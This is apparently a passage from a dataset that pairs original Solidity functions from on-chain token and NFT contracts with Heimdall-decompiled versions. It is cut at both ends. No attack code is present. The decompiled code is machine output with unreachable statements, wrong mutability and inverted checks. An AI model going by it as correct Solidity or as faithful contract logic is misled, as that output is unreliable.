Transfer(address(msg.sender), address(this), (store_e * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_e * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_e * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_f / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_j) {\n                if (0 - arg1) {\n                }\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_e * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_l) == (address(arg0))) {\n            if (address(store_l) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2C6C4c106F423c1C25932c474Abb356e8BBa8cC7", "original_solidity_code": "function supportsInterface(bytes4 interfaceId)\\n        public\\n        view\\n        override(ERC721, ERC721Enumerable, AccessControl)\\n        returns (bool)\\n    {\\n        return super.supportsInterface(interfaceId);\\n    }", "heimdall_decompiled_code": "function supportsInterface(bytes4 arg0) public pure returns (bool) {\n        require(arg0 == (uint32(arg0)));\n        require(0x7965db0b00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        uint32 var_a = !(!0x7965db0b00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        return !(!0x7965db0b00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(0x780e9d6300000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        var_a = !(!0x780e9d6300000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        return !(!0x780e9d6300000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(0x80ac58cd00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(0x80ac58cd00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        var_a = !(!0x80ac58cd00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        return !(!0x80ac58cd00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        var_a = !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n    }"}
{"contract_address": "0xF3B054a111b9fd6fc5289F473e456531ee89Ba1c", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function updateMarketingWallet(address newMarketingWallet) external onlyOwner {\\n        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);\\n        marketingWallet = newMarketingWallet;\\n    }", "heimdall_decompiled_code": "function updateMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit marketingWalletUpdated(address(arg0), address(store_e));\n        store_e = (address(arg0)) | (uint96(store_e));\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function balanceOf(address owner) public view virtual override returns (uint256) {\\n        if (owner == address(0)) revert BalanceQueryForZeroAddress();\\n        return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint64) {\n        require(arg0 == (address(arg0)));\n        require(address(arg0), CustomError_8f4eb604());\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = uint64(storage_map_n[var_a]);\n        return uint64(storage_map_n[var_a]);\n        var_c = 0x8f4eb60400000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4884709C72961015D2f9e97D123f4a2E480B9014", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xa5060B53791533b0dE5C831e925668A09eBCCd77", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(\r\n            newNum >= ((totalSupply() * 5) / 1000) / 1e18,\r\n            \"Cannot set maxWallet lower than 0.5%\"\r\n        );\r\n        maxWallet = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(0x05) & (totalSupply > 0x3333333333333333333333333333333333333333333333333333333333333333));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0xC1687b1453E40Bd9F46b33dFf3c6ea3A0Ea168eA", "original_solidity_code": "function balanceOf(\r\n        address account\r\n    ) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xbcdd47DA0822A0277Ae9A7c8E76B9Ed35d8c8e8B", "original_solidity_code": "function howOfenYouUseEtherumMainNet(uint8 number0To255_TheHigherTheNumberTheMoreFrequentlyUsed) public {\r\n    emit HowOfenYouUseEtherumMainNet(number0To255_TheHigherTheNumberTheMoreFrequentlyUsed);\r\n  }", "heimdall_decompiled_code": "function howOfenYouUseEtherumMainNet(uint8 arg0) public pure {\n        require(arg0 == (bytes1(arg0)));\n        bool var_a = bytes1(arg0);\n        emit HowOfenYouUseEtherumMainNet(bytes1(arg0));\n    }"}
{"contract_address": "0x5605C74F8079c9c648a513534354B5D6ee7dF8B4", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4CEDcba2dB7c99934bC64bBd575FEE5fE6E0F28b", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8084E313691B80C63c8f1a68de1003a685376aCA", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0x243aA7135A82d62dc6847C1Ad5A2E7c87c01502d", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x86612Df86F83dfD8E95d71E7766E1579Bf82BCab", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\r\n      require(_msgSender()==_taxWallet);\r\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\r\n      _finalBuyTax=_newFee;\r\n      _finalSellTax=_newFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        require(arg0 > store_e);\n        require(!arg0 > store_e);\n        store_e = arg0;\n        store_p = arg0;\n    }"}
{"contract_address": "0x8bD394Bd4b52207Df7a12F4a3EBF089e3d632826", "original_solidity_code": "function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {\\r\\n        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); \\r\\n        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));\\r\\n    }", "heimdall_decompiled_code": "function setContractSwapSettings(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        store_b = arg0;\n        require((arg1 == ((arg1 * store_c) / store_c)) | !store_c);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x0186a0);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x2196c73Bee850827528bf2e164c33441834dFe03", "original_solidity_code": "function mint(uint256 quantity) public payable {\r\n        require(quantity <= FREE_SUPPLY || quantity == PAID_SUPPLY || quantity == 100 || quantity == 200 || quantity == 500 , \"ERC721: Invalid quantity\");\r\n\r\n        if (quantity < FREE_SUPPLY ) {\r\n            require(msg.value >= 0.00008 ether, \"ERC721: Insufficient payment\");\r\n            _safeMint(msg.sender,quantity);\r\n        } else if (quantity == FREE_SUPPLY ) {\r\n            require(msg.value >= 0.0000001 ether, \"ERC721: Insufficient payment\");\r\n            _safeMint(msg.sender,quantity);\r\n        } else if (quantity == 100 ) {\r\n            require(msg.value >= 0.00088 ether, \"ERC721: Insufficient payment\");\r\n            _safeMint(msg.sender,quantity);\r\n        } else if (quantity == 200 ) {\r\n            require(msg.value >= 0.0016 ether, \"ERC721: Insufficient payment\");\r\n            _safeMint(msg.sender,quantity);\r\n        } else if (quantity == 500 ) {\r\n            require(msg.value >= 0.0044 ether, \"ERC721: Insufficient payment\");\r\n            _safeMint(msg.sender,quantity);\r\n        } else {\r\n            require(msg.value >= 0.0005 ether, \"ERC721: Insufficient payment\");\r\n            _safeMint(msg.sender,quantity);\r\n        }\r\n        \r\n        emit NewMint(msg.sender, quantity);\r\n    }", "heimdall_decompiled_code": "function mint(uint256 arg0) public payable {\n        require(!arg0 > 0x03);\n        require(arg0 == 0x0a);\n        require(arg0 == 0x0a);\n        require(arg0 == 0x0a);\n        require(arg0 == 0x0a);\n        require(!arg0 < 0x03);\n        require(!arg0 == 0x03);\n        require(!msg.value < 0x174876e800);\n        uint256 var_a = 0x20 + var_a;\n        uint256 var_b = 0;\n        require(arg0);\n        address var_c = address(msg.sender);\n        var_d = 0x05;\n        storage_map_e[var_c] = (arg0 * 0x010000000000000001) + storage_map_e[var_c];\n        var_c = totalSupply;\n        var_d = 0x04;\n        storage_map_e[var_c] = (address(msg.sender)) | ((block.timestamp << 0xa0) | ((arg0 == 0x01) << 0xe1));\n        emit Transfer(0, address(msg.sender), totalSupply);\n        require((totalSupply + 0x01) == (arg0 + totalSupply));\n        require(address(msg.sender));\n        totalSupply = arg0 + totalSupply;\n        require(!address(msg.sender).code.length);\n        emit NewMint(msg.sender, arg0);\n        var_e = 0x150b7a0200000000000000000000000000000000000000000000000000000000;\n        address var_f = address(msg.sender);\n        uint256 var_g = 0;\n        uint256 var_h = totalSupply - arg0;\n        var_i = 0x80;\n        uint256 var_j = var_a.length;\n        require(!0 > var_a.length);\n        uint256 var_k = 0;\n        require(address(msg.sender).code.length);\n        (bool success, bytes memory ret0) = address(msg.sender).{ value: var_g ether }Unresolved_150b7a02(var_f); // call\n        require(!ret0.length);\n        require(var_l);\n        var_e = 0xd1a57ed600000000000000000000000000000000000000000000000000000000;\n        var_a = var_a + (uint248(ret0.length + 0x3f));\n        uint256 var_e = ret0.length;\n        require(var_a.length, CustomError_d1a57ed6());\n        var_m = 0xd1a57ed600000000000000000000000000000000000000000000000000000000;\n        var_a = var_a + (uint248(ret0.length + 0x1f));\n        require(!((var_a + ret0.length) - var_a) < 0x20);\n        require(var_a.length == (uint32(var_a.length)));\n        require(0x01);\n        require(!ret0.length);\n        require(var_l);\n        var_n = 0xd1a57ed600000000000000000000000000000000000000000000000000000000;\n        var_a = var_a + (uint248(ret0.length + 0x3f));\n        uint256 var_n = ret0.length;\n        require(var_a.length, CustomError_d1a57ed6());\n        var_o = 0xd1a57ed600000000000000000000000000000000000000000000000000000000;\n        require(0x150b7a0200000000000000000000000000000000000000000000000000000000 == (uint32(var_a.length)), CustomError_d1a57ed6());\n        var_n = 0xd1a57ed600000000000000000000000000000000000000000000000000000000;\n        require((0x01 + (totalSupply - arg0)) < totalSupply);\n        require(totalSupply == totalSupply);\n        emit NewMint(msg.sender, arg0);\n        var_e = 0x2e07630000000000000000000000000000000000000000000000000000000000;\n        var_e = 0xb562e8dd00000000000000000000000000000000000000000000000000000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x1c;\n        var_g = 0x4552433732313a20496e73756666696369656e74207061796d656e7400000000;\n        require(!(0x64 == arg0), \"ERC721: Insufficient payment\");\n        require(!(msg.value < 0x03205af7670000), \"ERC721: Insufficient payment\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x1c;\n        var_g = 0x4552433732313a20496e73756666696369656e74207061796d656e7400000000;\n        require(!(0xc8 == arg0), \"ERC721: Insufficient payment\");\n        require(!(msg.value < 0x05af3107a40000), \"ERC721: Insufficient payment\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x1c;\n        var_g = 0x4552433732313a20496e73756666696369656e74207061796d656e7400000000;\n        require(!(0x01f4 == arg0), \"ERC721: Insufficient payment\");\n        require(!(msg.value < 0x0fa1c6d5030000), \"ERC721: Insufficient payment\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x1c;\n        var_g = 0x4552433732313a20496e73756666696369656e74207061796d656e7400000000;\n        require(!(msg.value < 0x01c6bf52634000), \"ERC721: Insufficient payment\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x1c;\n        var_g = 0x4552433732313a20496e73756666696369656e74207061796d656e7400000000;\n        require(!(msg.value < 0x48c273950000), \"ERC721: Insufficient payment\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x1c;\n        var_g = 0x4552433732313a20496e73756666696369656e74207061796d656e7400000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x18;\n        var_g = 0x4552433732313a20496e76616c6964207175616e746974790000000000000000;\n        require(!(arg0 > 0x03), \"ERC721: Invalid quantity\");\n        require(!(arg0 > 0x03), \"ERC721: Invalid quantity\");\n        require(!(arg0 > 0x03), \"ERC721: Invalid quantity\");\n        require(!(arg0 > 0x03), \"ERC721: Invalid quantity\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_f = 0x18;\n        var_g = 0x4552433732313a20496e76616c6964207175616e746974790000000000000000;\n    }"}
{"contract_address": "0xf579fAba7EE17180e7e52E9D49774cC07220D5e3", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x05f5e100) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x05f5e100) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x8d2d07f485Ea0cEf2E843b1EEE5F2237e8e9d013", "original_solidity_code": "function setMaxAll() public onlyOwner {\r\n    }", "heimdall_decompiled_code": "function setMaxAll() public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n    }"}
{"contract_address": "0x210a768a5146f4d3C1068bB37dD780304c6D648D", "original_solidity_code": "function manualSwap() external {\n        require(_msgSender()==_taxWallet);\n        uint256 tokenBalance=balanceOf(address(this));\n        if(tokenBalance>0){\n          swapTokensForEth(tokenBalance);\n        }\n        uint256 ethBalance=address(this).balance;\n        if(ethBalance>0){\n          sendETHToFee(ethBalance);\n        }\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_p)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_f = 0x01000000000000000000000000000000000000000000 | (uint248(store_f));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!((var_d + ret0.length) - var_d) < 0x20);\n        require(var_d.length == (address(var_d.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this));\n        require(address(store_l));\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l);\n        address var_b = 